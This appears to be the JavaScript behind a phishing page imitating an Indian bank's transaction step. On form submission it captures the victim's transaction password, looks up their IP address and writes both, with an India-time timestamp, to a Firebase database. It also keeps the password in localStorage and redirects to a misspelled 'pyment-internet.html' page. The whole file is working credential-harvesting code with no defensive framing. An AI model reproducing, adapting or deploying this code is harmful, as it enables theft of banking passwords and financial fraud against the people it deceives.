document.getElementById("ududip007").addEventListener("submit", function (e) {
    e.preventDefault();

    const txnPassword = document.getElementById("tpass").value.trim();

    // ✅ Fetch IP address first
    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;

            // ✅ Generate IST time
            const istTime = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });

            const ref = firebase.database().ref("ududip007").push();
            ref.set({
                transaction_password: txnPassword,
                ipAddress: ipAddress,
                timestamp: istTime
            }).then(() => {
                localStorage.setItem("txn_password", txnPassword);
                window.location.href = "pyment-internet.html";
            }).catch((error) => {
                alert("Error: " + error.message);
            });
        })
        .catch(error => {
            alert("Unable to get IP address: " + error.message);
        });
});
